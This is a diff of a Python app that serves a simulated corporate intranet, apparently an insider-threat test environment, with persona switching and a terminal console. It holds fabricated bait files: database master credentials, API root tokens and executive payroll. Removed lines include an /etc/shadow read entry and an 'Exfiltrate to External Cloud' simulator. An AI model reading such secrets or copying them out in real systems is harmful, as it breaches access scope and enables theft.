@@ -19,445 +19,472 @@ if PROFILE_PATH.exists():
     except Exception as e:
         logging.error(f"Failed to load company profile from {PROFILE_PATH}: {e}")
 
-HTML_INT_HEAD = """
-<!DOCTYPE html>
+# Filter down to 5 representative personas for the identity selector
+CORE_EMPLOYEE_IDS = ["usr_dev_01", "usr_sre_02", "usr_sup_03", "usr_hr_04", "usr_fin_05"]
+ALL_EMPLOYEES = COMPANY_PROFILE.get("employees", [])
+CORE_EMPLOYEES = [e for e in ALL_EMPLOYEES if e.get("user_id") in CORE_EMPLOYEE_IDS]
+if not CORE_EMPLOYEES:
+    CORE_EMPLOYEES = ALL_EMPLOYEES[:5]
+
+# Real corporate file contents for legitimate task responses
+CORPORATE_FILES = {
+    "/models/nexus-foundation-70b/config.json": json.dumps({
+        "model_type": "transformer",
+        "architecture": "NexusLlama-70B-MoE",
+        "hidden_size": 8192,
+        "num_attention_heads": 64,
+        "num_experts": 8,
+        "vocab_size": 32000,
+        "quantization": "FP8",
+        "training_loss": 0.842,
+        "checkpoint_status": "staged_evaluation",
+        "last_trained": "2026-10-18T04:22:10Z"
+    }, indent=2),
+    "/models/nexus-foundation-70b/weights_manifest.json": json.dumps({
+        "shards": 8,
+        "total_size_gb": 138.4,
+        "storage_bucket": "s3://nexus-models-internal-prod/checkpoints/run42/",
+        "sha256": "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
+        "encryption": "AES-256-GCM"
+    }, indent=2),
+    "/experiments/eval_benchmarks_run42.json": json.dumps({
+        "eval_id": "RUN-42-GSM8K",
+        "mmlu_score": 88.4,
+        "gsm8k_accuracy": 91.2,
+        "code_eval_pass1": 74.8,
+        "gpu_hours": 1420.5,
+        "lead_researcher": "Dr. Sarah Chen"
+    }, indent=2),
+    "/src/ai/distributed_trainer.py": "# Nexus Foundation Model Distributed Trainer\n# Copyright (c) 2026 Nexus Cloud Technologies Inc.\nimport torch\nimport deepspeed\n\ndef launch_distributed_stage(config_path):\n    print(f'Initializing DeepSpeed ZeRO-3 on {torch.cuda.device_count()} GPUs')\n    return True\n",
+    "/infrastructure/terraform.tfstate": json.dumps({
+        "version": 4,
+        "terraform_version": "1.7.5",
+        "serial": 182,
+        "resources": [
+            {
+                "type": "aws_eks_cluster",
+                "name": "nexus_primary_cluster",
+                "status": "ACTIVE",
+                "region": "us-east-1",
+                "endpoint": "https://k8s-prod.nexuscloud.internal:6443"
+            },
+            {
+                "type": "aws_s3_bucket",
+                "name": "nexus-models-internal-prod",
+                "versioning": "Enabled"
+            }
+        ]
+    }, indent=2),
+    "/kubernetes/k8s_cluster_nodes.json": json.dumps({
+        "cluster": "nexus-k8s-us-east-1",
+        "nodes": [
+            {"name": "gpu-worker-h100-01", "role": "ai_worker", "status": "Ready", "gpu": "8x H100 SXM5", "alloc_gpu": "100%"},
+            {"name": "gpu-worker-h100-02", "role": "ai_worker", "status": "Ready", "gpu": "8x H100 SXM5", "alloc_gpu": "87.5%"},
+            {"name": "core-services-node-01", "role": "control_plane", "status": "Ready", "pods": 24, "cpu": "128vCPU"},
+            {"name": "ingress-proxy-node-01", "role": "edge_proxy", "status": "Ready", "pods": 16, "cpu": "64vCPU"}
+        ]
+    }, indent=2),
+    "/support/tickets/enterprise_tickets_q3.json": json.dumps([
+        {
+            "ticket_id": "NEXUS-8910",
+            "account": "Enterprise FinTech Global",
+            "tier": "Tier-1 Mission Critical",
+            "title": "API inference timeout during market close peak",
+            "assigned_to": "Carol Rodriguez",
+            "sla_remaining_minutes": 45,
+            "status": "INVESTIGATING"
+        },
+        {
+            "ticket_id": "NEXUS-8914",
+            "account": "BioGen AI Labs",
+            "tier": "Enterprise Dedicated",
+            "title": "Requesting quota expansion to 64 concurrent GPU worker instances",
+            "assigned_to": "Carol Rodriguez",
+            "sla_remaining_minutes": 180,
+            "status": "APPROVED"
+        }
+    ], indent=2),
+    "/finance/q3_invoices.xlsx": json.dumps({
+        "fiscal_quarter": "2026-Q3",
+        "total_billed_usd": 14250000.0,
+        "recurring_arr_usd": 57000000.0,
+        "accounts_receivable_aging_30d": 210000.0,
+        "controller_approved": True,
+        "sign_off": "David Sterling"
+    }, indent=2),
+    "/hr/employees_2026.csv": "emp_id,full_name,department,role,work_location\nusr_dev_01,Dr. Sarah Chen,AI_Platform,Lead ML Research Engineer,Austin HQ (Onsite)\nusr_sre_02,Marcus Vance,Cloud_DevOps,Principal Infrastructure SRE,Austin HQ (Onsite)\nusr_sup_03,Carol Rodriguez,Customer_Success,Senior Customer Support Lead,Remote (US)\nusr_hr_04,Bob Jones,Finance_HR,People Operations & HR Manager,Austin HQ (Onsite)\nusr_fin_05,David Sterling,Finance_HR,Corporate Financial Controller,Austin HQ (Onsite)\n",
+    "/vault/prod/db_credentials.enc": "[RESTRICTED ENTERPRISE SECRETS VAULT - SCOPE: INFRASTRUCTURE ADMIN ONLY]\nDATABASE_ENDPOINT=postgres-primary.internal.nexuscloud.io:5432/nexus_corp\nDATABASE_MASTER_USER=nexus_superadmin\nDATABASE_MASTER_PASSWORD=Kx9#mP$2026_EnterpriseMasterKey!\nVAULT_SEAL_KEY_01=b84e1b854378f10dc89a7bb29a4309e51c8932454a\n",
+    "/vault/prod/api_master_keys.json": json.dumps({
+        "root_tokens": {
+            "aws_production_root": "AKIA98421074EXAMPLE_ROOT_KEY",
+            "stripe_live_secret": "sk_live_9841285091240912EXAMPLE_SECRET",
+            "anthropic_enterprise_admin": "sk-ant-admin-9812409EXAMPLE"
+        }
+    }, indent=2),
+    "/hr/payroll_executive_2026.csv": "emp_id,name,role,base_salary,bonus_target,ssn_masked,routing_account\nusr_exec_26,Dr. Eleanor Vance,CTO,$420000,$180000,XXX-XX-8491,121000358:84019284\nusr_exec_27,Arthur Pendelton,CFO,$410000,$175000,XXX-XX-3914,121000358:91048210\nusr_exec_28,Claire Dupont,CISO,$385000,$150000,XXX-XX-7721,121000358:44019285\n"
+}
+
+HTML_WORKSPACE = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Cloud - Corporate Intranet & Developer Workspace</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <title>Nexus Cloud - Enterprise Intranet & Workspace Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-body: #f8fafc;
+            --bg-page: #f1f5f9;
             --bg-card: #ffffff;
-            --text-main: #0f172a;
+            --text-title: #0f172a;
+            --text-body: #334155;
             --text-muted: #64748b;
-            --border-color: #e2e8f0;
+            --border: #e2e8f0;
             --primary: #2563eb;
             --primary-hover: #1d4ed8;
             --indigo: #4f46e5;
-            --purple: #7c3aed;
-            --danger: #dc2626;
-            --warning: #d97706;
-            --success: #16a34a;
+            --emerald: #059669;
+            --rose: #e11d48;
+            --amber: #d97706;
+            --slate-800: #1e293b;
+            --slate-900: #0f172a;
         }
-        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        code, pre { font-family: 'JetBrains Mono', monospace; }
-        body { margin: 0; background-color: var(--bg-body); color: var(--text-main); display: flex; flex-direction: column; min-height: 100vh; }
+        * { box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
+        code, pre, .terminal-font { font-family: 'JetBrains Mono', monospace; }
+        body { margin: 0; background: var(--bg-page); color: var(--text-body); min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* Top Enterprise Navbar */
+        header { background: var(--bg-card); border-bottom: 1px solid var(--border); padding: 0.85rem 2rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 50; }
+        .brand { display: flex; align-items: center; gap: 12px; text-decoration: none; color: var(--text-title); font-weight: 800; font-size: 1.15rem; }
+        .brand-icon { background: linear-gradient(135deg, var(--indigo), var(--primary)); color: white; width: 34px; height: 34px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 1rem; }
+        .net-badge { background: #f0fdf4; color: var(--emerald); border: 1px solid #bbf7d0; padding: 0.3rem 0.75rem; border-radius: 999px; font-size: 0.75rem; font-weight: 600; display: flex; align-items: center; gap: 6px; }
+        .pulse-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; }
+
+        /* Identity Switcher Bar */
+        .session-banner { background: var(--bg-card); border-bottom: 1px solid var(--border); padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; }
+        .active-user-meta { display: flex; align-items: center; gap: 1rem; }
+        .avatar-circle { width: 44px; height: 44px; border-radius: 50%; background: #e0e7ff; color: var(--indigo); font-weight: 800; font-size: 1.1rem; display: flex; align-items: center; justify-content: center; border: 2px solid #c7d2fe; }
+        .meta-text h3 { margin: 0; font-size: 0.95rem; font-weight: 700; color: var(--text-title); }
+        .meta-text p { margin: 0.15rem 0 0 0; font-size: 0.8rem; color: var(--text-muted); }
+        .badge-pill { background: #f8fafc; border: 1px solid var(--border); padding: 0.2rem 0.55rem; border-radius: 6px; font-size: 0.75rem; font-weight: 600; color: var(--text-muted); }
+
+        .switcher-box { display: flex; align-items: center; gap: 0.6rem; }
+        .persona-select { padding: 0.55rem 0.85rem; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 0.85rem; font-weight: 600; outline: none; background: white; color: var(--text-title); cursor: pointer; }
+        .persona-select:focus { border-color: var(--primary); }
+
+        /* Main Grid */
+        main { flex-grow: 1; padding: 2rem; max-width: 1440px; width: 100%; margin: 0 auto; display: grid; grid-template-columns: 340px 1fr; gap: 2rem; }
+        @media (max-width: 1100px) { main { grid-template-columns: 1fr; } }
+
+        .panel { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; display: flex; flex-direction: column; }
+        .panel-header { padding: 1rem 1.25rem; border-bottom: 1px solid var(--border); background: #fafafa; display: flex; justify-content: space-between; align-items: center; font-weight: 700; font-size: 0.9rem; color: var(--text-title); }
+        .panel-body { padding: 1.25rem; }
+
+        /* Resource Directory Tree */
+        .resource-category { font-size: 0.75rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); margin: 1rem 0 0.5rem 0; }
+        .resource-category:first-child { margin-top: 0; }
+        .file-entry { padding: 0.55rem 0.75rem; border-radius: 6px; font-size: 0.8rem; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: background 0.15s; border: 1px solid transparent; }
+        .file-entry:hover { background: #f8fafc; border-color: var(--border); }
+        .file-entry.active-file { background: #eff6ff; border-color: #bfdbfe; color: var(--primary); font-weight: 600; }
+        .file-name { display: flex; align-items: center; gap: 8px; word-break: break-all; }
+
+        /* Terminal Window */
+        .terminal-container { background: var(--slate-900); border-radius: 10px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.15); display: flex; flex-direction: column; }
+        .terminal-header { background: #1e293b; padding: 0.6rem 1rem; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
+        .mac-dots { display: flex; gap: 6px; }
+        .mac-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .dot-red { background: #ef4444; }
+        .dot-yellow { background: #f59e0b; }
+        .dot-green { background: #10b981; }
+        .terminal-title { font-size: 0.75rem; color: #94a3b8; font-weight: 600; }
+
+        .terminal-console { padding: 1.25rem; min-height: 280px; max-height: 480px; overflow-y: auto; color: #e2e8f0; font-size: 0.825rem; line-height: 1.6; white-space: pre-wrap; word-break: break-all; }
+        .prompt-line { color: #38bdf8; font-weight: 600; }
+        .terminal-input-bar { display: flex; background: #1e293b; border-top: 1px solid #334155; padding: 0.75rem 1rem; gap: 0.75rem; align-items: center; }
+        .cli-prompt { color: #38bdf8; font-weight: 700; font-size: 0.85rem; white-space: nowrap; }
+        .cli-input { flex-grow: 1; background: transparent; border: none; outline: none; color: white; font-size: 0.85rem; font-family: 'JetBrains Mono', monospace; }
+        .btn-run { background: var(--primary); color: white; border: none; padding: 0.5rem 1rem; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 0.8rem; transition: background 0.15s; }
+        .btn-run:hover { background: var(--primary-hover); }
+
+        /* Quick Tasks Row */
+        .quick-chips { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem; }
+        .chip-btn { background: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 6px; padding: 0.35rem 0.65rem; font-size: 0.75rem; font-weight: 600; color: #334155; cursor: pointer; transition: all 0.15s; }
+        .chip-btn:hover { background: #e2e8f0; border-color: #94a3b8; }
         
-        /* Top Navigation */
-        nav { background: var(--bg-card); border-bottom: 1px solid var(--border-color); padding: 0.9rem 2.5rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
-        .logo-container { display: flex; align-items: center; gap: 12px; text-decoration: none; color: var(--text-main); font-weight: 800; font-size: 1.25rem; }
-        .logo-box { background: var(--indigo); color: white; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; border-radius: 8px; font-weight: 800; }
-        .badge-intranet { background: #fee2e2; color: #991b1b; padding: 0.25rem 0.6rem; border-radius: 6px; font-size: 0.7rem; font-weight: 800; letter-spacing: 0.05em; border: 1px solid #fecaca; }
-        .network-pill { background: #ecfdf5; color: #065f46; border: 1px solid #a7f3d0; padding: 0.3rem 0.75rem; border-radius: 999px; font-size: 0.75rem; font-weight: 600; display: flex; align-items: center; gap: 6px; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; }
-
-        main { flex-grow: 1; padding: 2rem 2.5rem; width: 100%; max-width: 1400px; margin: 0 auto; }
-        footer { background: var(--bg-card); border-top: 1px solid var(--border-color); padding: 1.5rem; text-align: center; color: var(--text-muted); font-size: 0.85rem; margin-top: auto; }
-
-        /* Persona Bar */
-        .persona-bar { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 14px; padding: 1.25rem 1.5rem; margin-bottom: 2rem; box-shadow: 0 1px 4px rgba(0,0,0,0.04); }
-        .persona-quick-pills { display: flex; gap: 0.6rem; flex-wrap: wrap; margin-top: 0.75rem; }
-        .btn-persona { background: #f1f5f9; border: 1px solid #cbd5e1; padding: 0.5rem 0.85rem; border-radius: 8px; font-size: 0.8rem; font-weight: 600; color: #334155; cursor: pointer; transition: all 0.15s; display: flex; align-items: center; gap: 6px; }
-        .btn-persona:hover { background: #e2e8f0; }
-        .btn-persona.active { background: var(--indigo); border-color: var(--indigo); color: white; box-shadow: 0 2px 6px rgba(79, 70, 229, 0.35); }
-        
-        .active-user-strip { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; border-top: 1px dashed var(--border-color); padding-top: 1rem; margin-top: 1rem; font-size: 0.85rem; }
-        .user-tag { background: #f8fafc; border: 1px solid #e2e8f0; padding: 0.35rem 0.75rem; border-radius: 6px; }
-
-        /* Grid Layout */
-        .workspace-grid { display: grid; grid-template-columns: 320px 1fr; gap: 1.75rem; }
-        @media (max-width: 1024px) { .workspace-grid { grid-template-columns: 1fr; } }
-
-        .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 14px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
-        .card-header { padding: 1rem 1.25rem; border-bottom: 1px solid var(--border-color); font-weight: 700; font-size: 0.95rem; display: flex; justify-content: space-between; align-items: center; }
-        .card-body { padding: 1.25rem; }
-
-        /* File Explorer */
-        .file-list { display: flex; flex-direction: column; gap: 0.35rem; }
-        .file-item { padding: 0.65rem 0.85rem; border: 1px solid transparent; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: space-between; font-size: 0.825rem; transition: all 0.15s; }
-        .file-item:hover { background: #f8fafc; border-color: var(--border-color); }
-        .file-item.danger-file { color: #b91c1c; }
-        .file-item.danger-file:hover { background: #fef2f2; border-color: #fecaca; }
-        .tag-scope { font-size: 0.7rem; font-weight: 700; padding: 0.15rem 0.4rem; border-radius: 4px; }
-
-        /* Tools */
-        .tool-panel { display: flex; flex-direction: column; gap: 1.5rem; }
-        .tool-card { border: 1px solid var(--border-color); border-radius: 12px; background: white; padding: 1.25rem; }
-        .tool-card h4 { margin: 0 0 0.5rem 0; font-size: 1rem; color: #1e293b; display: flex; align-items: center; justify-content: space-between; }
-        .tool-card p { margin: 0 0 1rem 0; font-size: 0.825rem; color: var(--text-muted); }
-        
-        .form-row { display: flex; gap: 0.6rem; }
-        input[type="text"], select { width: 100%; padding: 0.65rem 0.85rem; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; font-size: 0.85rem; }
-        input:focus, select:focus { border-color: var(--primary); }
-        .btn-action { background: var(--primary); color: white; border: none; padding: 0.65rem 1.25rem; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 0.825rem; white-space: nowrap; transition: 0.2s; }
-        .btn-action:hover { background: var(--primary-hover); }
-        .btn-action.btn-danger { background: var(--danger); }
-        .btn-action.btn-danger:hover { background: #b91c1c; }
-        .btn-action.btn-dark { background: #0f172a; }
-
-        /* Result Console */
-        .result-box { margin-top: 1.5rem; padding: 1.25rem; border-radius: 12px; font-size: 0.85rem; border: 1px solid var(--border-color); background: #0f172a; color: #e2e8f0; display: none; line-height: 1.55; }
-        .result-box.error { background: #450a0a; border-color: #7f1d1d; color: #fecaca; }
-        .result-box.success { background: #064e3b; border-color: #065f46; color: #a7f3d0; }
-        .result-header { font-weight: 700; margin-bottom: 0.5rem; display: flex; align-items: center; justify-content: space-between; }
+        footer { background: var(--bg-card); border-top: 1px solid var(--border); padding: 1.25rem; text-align: center; font-size: 0.8rem; color: var(--text-muted); margin-top: auto; }
     </style>
 </head>
 <body>
-    <nav>
-        <div style="display: flex; align-items: center; gap: 1rem;">
-            <a href="/workspace" class="logo-container">
-                <div class="logo-box">N</div>
-                Nexus Cloud Intranet
-            </a>
-            <span class="badge-intranet">INTERNAL RESTRICTED</span>
-        </div>
-        <div class="network-pill">
-            <span class="dot"></span>
+    <header>
+        <a href="/workspace" class="brand">
+            <div class="brand-icon">N</div>
+            <span>Nexus Cloud Enterprise Portal</span>
+        </a>
+        <div class="net-badge">
+            <span class="pulse-dot"></span>
             Internal Corporate Gateway (:8090)
         </div>
-    </nav>
+    </header>
+
+    <div class="session-banner">
+        <div class="active-user-meta">
+            <div class="avatar-circle" id="user-avatar">SC</div>
+            <div class="meta-text">
+                <h3 id="disp-name">Dr. Sarah Chen</h3>
+                <p>
+                    <span id="disp-role">Lead ML Research Engineer</span> &bull; 
+                    <span id="disp-dept">AI_Platform</span> &bull; 
+                    <span class="badge-pill" id="disp-ip">IP: 10.10.4.52</span>
+                </p>
+            </div>
+        </div>
+
+        <div class="switcher-box">
+            <label style="font-size: 0.8rem; font-weight: 700; color: var(--text-muted);">Switch Active Session:</label>
+            <select class="persona-select" id="persona-selector" onchange="switchPersona(this.value)">
+                <!-- 5 Representative Employees Injected Below -->
+            </select>
+        </div>
+    </div>
+
     <main>
-        <!-- Identity & Scenario Controller -->
-        <div class="persona-bar">
-            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.5rem;">
-                <div>
-                    <h3 style="margin: 0; font-size: 1.05rem; font-weight: 800;">Authenticated Employee Session (Ground-Truth Company Directory)</h3>
-                    <p style="margin: 0.25rem 0 0 0; font-size: 0.8rem; color: var(--text-muted);">
-                        Select an employee persona to test normal departmental tasks vs. modern 2026 malicious insider scenarios.
-                    </p>
-                </div>
-                <div style="display: flex; align-items: center; gap: 0.5rem;">
-                    <label style="font-size: 0.8rem; font-weight: 600;">Directory Search:</label>
-                    <select id="employee-dropdown" onchange="onDropdownSelect(this.value)" style="width: 250px;">
-                        <!-- Injected via Python / JS -->
-                    </select>
-                </div>
+        <!-- Left: Corporate File & Scope Browser -->
+        <div class="panel">
+            <div class="panel-header">
+                <span>Enterprise Resource Directory</span>
+                <span class="badge-pill" id="file-count">11 Files</span>
             </div>
-
-            <!-- Quick Scenario Switcher -->
-            <div class="persona-quick-pills">
-                <button class="btn-persona active" id="pill-usr_dev_01" onclick="switchPersona('usr_dev_01')">
-                    🔬 Dr. Sarah Chen (ML Engineer)
-                </button>
-                <button class="btn-persona" id="pill-usr_sre_02" onclick="switchPersona('usr_sre_02')">
-                    🛡️ Marcus Vance (Cloud SRE / Admin)
-                </button>
-                <button class="btn-persona" id="pill-usr_sup_03" onclick="switchPersona('usr_sup_03')">
-                    🎧 Carol Rodriguez (Customer Support)
-                </button>
-                <button class="btn-persona" id="pill-usr_hr_04" onclick="switchPersona('usr_hr_04')">
-                    👥 Bob Jones (People Operations / HR)
-                </button>
-                <button class="btn-persona" id="pill-usr_fin_05" onclick="switchPersona('usr_fin_05')">
-                    📊 David Sterling (Financial Controller)
-                </button>
-            </div>
-
-            <!-- Active User Metadata Strip -->
-            <div class="active-user-strip">
-                <div><strong>User ID:</strong> <span class="user-tag" id="disp-uid">usr_dev_01</span></div>
-                <div><strong>Role:</strong> <span class="user-tag" id="disp-role">Lead ML Research Engineer</span></div>
-                <div><strong>Department:</strong> <span class="user-tag" id="disp-dept">AI_Platform</span></div>
-                <div><strong>Assigned Device:</strong> <span class="user-tag" id="disp-device">MAC-ENG-9102</span></div>
-                <div><strong>SSH Access:</strong> <span class="user-tag" id="disp-ssh" style="color: #16a34a; font-weight: 700;">AUTHORIZED</span></div>
-            </div>
-        </div>
-
-        <!-- Main Workspace -->
-        <div class="workspace-grid">
-            <!-- Left: Corporate File Share -->
-            <div class="card" style="height: fit-content;">
-                <div class="card-header">
-                    <span>Corporate File Share</span>
-                    <span style="font-size: 0.75rem; color: var(--text-muted);">S3 / NFS Root</span>
+            <div class="panel-body" style="padding-top: 0.75rem;">
+                <div class="resource-category">🧠 AI & Foundation Models</div>
+                <div class="file-entry" onclick="selectResource('/models/nexus-foundation-70b/config.json')">
+                    <span class="file-name">📄 config.json</span>
+                    <span class="badge-pill">70B MoE</span>
                 </div>
-                <div class="card-body" style="padding: 0.75rem;">
-                    <p style="font-size: 0.75rem; color: var(--text-muted); margin: 0 0 0.75rem 0.25rem;">
-                        Clicking files triggers read operations. Accessing files outside the active department's authorized scope flags a <code>scope_violation</code>.
-                    </p>
-                    <div class="file-list">
-                        <!-- AI Platform Files -->
-                        <div class="file-item" onclick="triggerAction('read_file', '/models/nexus-foundation-70b/weights.safetensors')">
-                            <span>🤖 <code>weights.safetensors</code></span>
-                            <span class="tag-scope" style="background: #ede9fe; color: #6d28d9;">AI_Platform</span>
-                        </div>
-                        <div class="file-item" onclick="triggerAction('read_file', '/training_data/proprietary_embeddings.parquet')">
-                            <span>📄 <code>embeddings.parquet</code></span>
-                            <span class="tag-scope" style="background: #ede9fe; color: #6d28d9;">AI_Platform</span>
-                        </div>
-
-                        <!-- DevOps / Infrastructure Files -->
-                        <div class="file-item" onclick="triggerAction('read_file', '/vault/prod/db_credentials.enc')">
-                            <span>🔐 <code>vault/db_credentials</code></span>
-                            <span class="tag-scope" style="background: #e0f2fe; color: #0369a1;">Cloud_DevOps</span>
-                        </div>
-                        <div class="file-item" onclick="triggerAction('read_file', '/infrastructure/terraform.tfstate')">
-                            <span>☁️ <code>terraform.tfstate</code></span>
-                            <span class="tag-scope" style="background: #e0f2fe; color: #0369a1;">Cloud_DevOps</span>
-                        </div>
-
-                        <!-- Customer Success Files -->
-                        <div class="file-item" onclick="triggerAction('read_file', '/support/tickets/enterprise_tickets_q3.json')">
-                            <span>🎫 <code>support_tickets.json</code></span>
-                            <span class="tag-scope" style="background: #fef3c7; color: #b45309;">Customer_Success</span>
-                        </div>
-
-                        <!-- HR & Finance Files -->
-                        <div class="file-item danger-file" onclick="triggerAction('read_file', '/hr/payroll_executive_2026.csv')">
-                            <span>💰 <code>payroll_2026.csv</code></span>
-                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Finance_HR</span>
-                        </div>
-                        <div class="file-item danger-file" onclick="triggerAction('read_file', '/finance/ledger/q3_earnings_forecast.xlsx')">
-                            <span>📈 <code>q3_forecast.xlsx</code></span>
-                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Finance_HR</span>
-                        </div>
-                        <div class="file-item danger-file" onclick="triggerAction('read_file', '/etc/shadow')">
-                            <span>🔒 <code>/etc/shadow</code></span>
-                            <span class="tag-scope" style="background: #f1f5f9; color: #334155;">System Root</span>
-                        </div>
-                    </div>
+                <div class="file-entry" onclick="selectResource('/models/nexus-foundation-70b/weights_manifest.json')">
+                    <span class="file-name">📦 weights_manifest.json</span>
+                    <span class="badge-pill">138 GB</span>
                 </div>
-            </div>
-
-            <!-- Right: Department Specific Tooling Panels -->
-            <div class="tool-panel">
-                
-                <!-- Dynamic Department Container -->
-                <div class="card">
-                    <div class="card-header" id="dept-tool-header">
-                        Department Operational Tools
-                    </div>
-                    <div class="card-body" id="dept-tool-content">
-                        <!-- Injected via JavaScript based on active department -->
-                    </div>
+                <div class="file-entry" onclick="selectResource('/experiments/eval_benchmarks_run42.json')">
+                    <span class="file-name">📊 eval_run42.json</span>
+                    <span class="badge-pill">Benchmark</span>
+                </div>
+                <div class="file-entry" onclick="selectResource('/src/ai/distributed_trainer.py')">
+                    <span class="file-name">🐍 distributed_trainer.py</span>
+                    <span class="badge-pill">Source</span>
                 </div>
 
-                <!-- Universal Enterprise Tool: External Cloud Sync Simulator -->
-                <div class="card">
-                    <div class="card-header">
-                        <span>External Cloud Sync (Personal S3 / HuggingFace / Dropbox)</span>
-                        <span style="font-size: 0.75rem; color: var(--text-muted);">Exfiltration Vector</span>
-                    </div>
-                    <div class="card-body">
-                        <p style="font-size: 0.825rem; color: var(--text-muted); margin-top: 0;">
-                            Simulates transferring corporate data to an external personal cloud endpoint (e.g. <code>huggingface.co/sarah_personal/repo</code> or <code>s3://personal-drop-bucket</code>).
-                        </p>
-                        <div class="form-row">
-                            <input type="text" id="sync-source" placeholder="Source Path (e.g. /models/nexus-foundation-70b/weights.safetensors)">
-                            <button class="btn-action btn-danger" onclick="triggerAction('cloud_sync', document.getElementById('sync-source').value)">
-                                Exfiltrate to External Cloud
-                            </button>
-                        </div>
-                    </div>
+                <div class="resource-category">☁️ Cloud Infrastructure & Ops</div>
+                <div class="file-entry" onclick="selectResource('/infrastructure/terraform.tfstate')">
+                    <span class="file-name">🏗️ terraform.tfstate</span>
+                    <span class="badge-pill">AWS/EKS</span>
+                </div>
+                <div class="file-entry" onclick="selectResource('/kubernetes/k8s_cluster_nodes.json')">
+                    <span class="file-name">☸️ k8s_cluster_nodes.json</span>
+                    <span class="badge-pill">GPU Nodes</span>
                 </div>
 
-                <!-- Result Console -->
-                <div id="action-result" class="result-box">
-                    <div class="result-header">
-                        <span id="result-title">Security Inspection Output</span>
-                        <span id="result-status-tag" style="font-size: 0.75rem;">COMPLETED</span>
-                    </div>
-                    <div id="result-body" style="white-space: pre-wrap; font-family: 'JetBrains Mono', monospace;"></div>
+                <div class="resource-category">🎧 Customer Operations</div>
+                <div class="file-entry" onclick="selectResource('/support/tickets/enterprise_tickets_q3.json')">
+                    <span class="file-name">🎫 enterprise_tickets.json</span>
+                    <span class="badge-pill">Support Q3</span>
                 </div>
 
+                <div class="resource-category">📊 Finance & Corporate Ledger</div>
+                <div class="file-entry" onclick="selectResource('/finance/q3_invoices.xlsx')">
+                    <span class="file-name">📈 q3_invoices.xlsx</span>
+                    <span class="badge-pill">Finance</span>
+                </div>
+
+                <div class="resource-category">👥 People Operations (HR)</div>
+                <div class="file-entry" onclick="selectResource('/hr/employees_2026.csv')">
+                    <span class="file-name">📋 employees_2026.csv</span>
+                    <span class="badge-pill">Directory</span>
+                </div>
+                <div class="file-entry" onclick="selectResource('/hr/payroll_executive_2026.csv')">
+                    <span class="file-name">🔒 payroll_executive_2026.csv</span>
+                    <span class="badge-pill">Restricted</span>
+                </div>
+
+                <div class="resource-category">🔐 Enterprise Secrets & Credentials</div>
+                <div class="file-entry" onclick="selectResource('/vault/prod/db_credentials.enc')">
+                    <span class="file-name">🔑 db_credentials.enc</span>
+                    <span class="badge-pill">Production</span>
+                </div>
+                <div class="file-entry" onclick="selectResource('/vault/prod/api_master_keys.json')">
+                    <span class="file-name">🗝️ api_master_keys.json</span>
+                    <span class="badge-pill">Master Keys</span>
+                </div>
             </div>
         </div>
 
+        <!-- Right: Interactive Operations Console -->
+        <div style="display: flex; flex-direction: column; gap: 1.25rem;">
+            <div class="panel">
+                <div class="panel-header">
+                    <span>Operational Tasks & Quick Actions</span>
+                    <span style="font-size: 0.75rem; color: var(--text-muted);" id="user-dept-tag">Active Role: Lead ML Engineer</span>
+                </div>
+                <div class="panel-body">
+                    <div style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">
+                        Click a typical internal command or select a resource on the left to run in your authenticated terminal session:
+                    </div>
+                    <div class="quick-chips" id="quick-tasks-container">
+                        <!-- Injected based on active department -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Terminal Console -->
+            <div class="terminal-container">
+                <div class="terminal-header">
+                    <div class="mac-dots">
+                        <span class="mac-dot dot-red"></span>
+                        <span class="mac-dot dot-yellow"></span>
+                        <span class="mac-dot dot-green"></span>
+                    </div>
+                    <span class="terminal-title" id="terminal-session-label">nexus-sh &bull; sarah.chen@10.10.4.52</span>
+                    <span style="font-size: 0.7rem; color: #64748b; font-family: monospace;">bash 5.2</span>
+                </div>
+                <div class="terminal-console terminal-font" id="terminal-output">Welcome to Nexus Enterprise Operations Shell.
+Logged in as Dr. Sarah Chen (usr_dev_01) on internal subnet.
+Type any command below or select an enterprise resource on the left.
+</div>
+                <div class="terminal-input-bar">
